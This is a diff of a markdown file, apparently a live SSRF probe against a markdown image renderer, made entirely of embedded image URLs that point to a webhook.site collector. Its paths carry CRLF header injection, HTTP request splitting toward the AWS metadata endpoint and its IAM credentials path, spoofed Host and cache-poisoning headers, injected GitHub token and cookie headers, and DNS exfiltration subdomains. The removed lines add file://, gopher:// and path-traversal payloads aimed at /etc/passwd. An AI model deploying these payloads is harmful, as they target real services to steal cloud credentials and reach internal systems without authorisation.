@@ -1,53 +1,52 @@
-# SSRF Test v10 - Protocol & Redirect Chain Tests
+# SSRF Test v11 - Advanced Combinations
 
 ## Baseline
-![v10-canary](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/v10-canary.gif)
+![v11-canary](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/v11-canary.gif)
 
-## Protocol Handlers in Path
-![proto1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/file://localhost/etc/passwd.gif)
-![proto2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/gopher://127.0.0.1:25/1EHLO.gif)
-![proto3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/dict://127.0.0.1:6379/info.gif)
-![proto4](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/ldap://127.0.0.1:389/dc=example.gif)
+## CRLF with Chunked Transfer Encoding
+![chunk1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/chunk%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a5%0d%0aHello%0d%0a0%0d%0a%0d%0a.gif)
+![chunk2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/te%0d%0aTransfer-Encoding:%20identity%0d%0aContent-Length:%200%0d%0a%0d%0a.gif)
 
-## CRLF + Host Header Injection Combined
-![crlf1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/inject%0d%0aHost:%20169.254.169.254%0d%0a.gif)
-![crlf2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/split%0d%0a%0d%0aGET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a.gif)
-![crlf3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/x%0d%0aX-Forwarded-Host:%20internal-api.github.com%0d%0a.gif)
+## HTTP/2 Pseudo-Headers in CRLF
+![h2-1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/h2%0d%0a:authority:%20169.254.169.254%0d%0a.gif)
+![h2-2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/h2%0d%0a:path:%20/latest/meta-data/%0d%0a.gif)
+![h2-3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/h2%0d%0a:scheme:%20http%0d%0a:authority:%20169.254.169.254%0d%0a:path:%20/latest/meta-data/iam/security-credentials/%0d%0a.gif)
 
-## Path Traversal Sequences
-![trav1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/..%2f..%2f..%2fetc%2fpasswd)
-![trav2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/....//....//....//etc//passwd)
-![trav3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/..%252f..%252f..%252fetc%252fpasswd)
-![trav4](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/%2e%2e/%2e%2e/%2e%2e/etc/passwd)
+## Host Header Variations via CRLF
+![host1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%200.0.0.0%0d%0a.gif)
+![host2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20127.1%0d%0a.gif)
+![host3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%202130706433%0d%0a.gif)
+![host4](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%200x7f000001%0d%0a.gif)
+![host5](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20localtest.me%0d%0a.gif)
+![host6](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20spoofed.burpcollaborator.net%0d%0a.gif)
 
-## IPv6 Localhost Variants
-![ipv6a](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/ipv6-bracket-%5B::1%5D.gif)
-![ipv6b](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/ipv6-full-%5B::ffff:127.0.0.1%5D.gif)
-![ipv6c](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/ipv6-0-%5B::ffff:0:0%5D.gif)
+## Connection Header Injection
+![conn1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aConnection:%20keep-alive%0d%0a.gif)
+![conn2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aConnection:%20close%0d%0aX-Custom:%20injected%0d%0a.gif)
+![conn3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aUpgrade:%20websocket%0d%0aConnection:%20Upgrade%0d%0a.gif)
 
-## Null Byte Variants
-![null1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/null1%00169.254.169.254.gif)
-![null2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/null2.gif%00.evil.com)
-![null3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/null3%00%0d%0aHost:%20internal.gif)
+## Cache Poisoning Headers via CRLF
+![cache1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aX-Forwarded-Proto:%20https%0d%0aX-Forwarded-Port:%20443%0d%0a.gif)
+![cache2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aX-Original-URL:%20/admin%0d%0a.gif)
+![cache3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aX-Rewrite-URL:%20/admin%0d%0a.gif)
+![cache4](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aX-Host:%20evil.com%0d%0a.gif)
 
-## Request Splitting via Double CRLF
-![split1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/req1%0d%0a%0d%0aABC.gif)
-![split2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/req2%0a%0aABC.gif)
-![split3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/req3%0d%0d%0aABC.gif)
+## HTTP Request Pipeline via Double Request
+![pipe1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/a.gif%20HTTP/1.1%0d%0aHost:%20webhook.site%0d%0a%0d%0aGET%20http://169.254.169.254/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0aGET%20/ignored)
+![pipe2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/b%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/latest/meta-data/iam/security-credentials/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a.gif)
 
-## AWS Metadata Path Tests
-![aws1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/latest/meta-data/iam/security-credentials/)
-![aws2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/latest/dynamic/instance-identity/document)
-![aws3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/latest/user-data)
+## Absolute URL Override Attempts
+![abs1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/@169.254.169.254/latest/meta-data/)
+![abs2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/\\169.254.169.254\latest\meta-data\)
+![abs3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/../../../169.254.169.254/latest/)
 
-## Internal Service Paths
-![int1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/admin)
-![int2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/.git/config)
-![int3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/server-status)
-![int4](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/.well-known/openid-configuration)
+## Internal GitHub Paths via CRLF
+![gh1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20api.github.com%0d%0aAuthorization:%20token%20ghp_xxxxxxxxxxxx%0d%0a.gif)
+![gh2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20github.com%0d%0aCookie:%20_gh_sess=xxx%0d%0a.gif)
 
-## DNS Test
-![dns1](https://v10-test.9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc.dnshook.site/dns.gif)
+## DNS Exfil with Payload Data
+![dns1](https://payload1-data.3fa090cc-2c80-4ece-b5a9-8e17bc09461d.dnshook.site/exfil.gif)
+![dns2](https://v11-crlf-success.3fa090cc-2c80-4ece-b5a9-8e17bc09461d.dnshook.site/marker.gif)
 
 ## Version Marker
-Timestamp: v10-protocol-path-tests
+Timestamp: v11-advanced-combinations
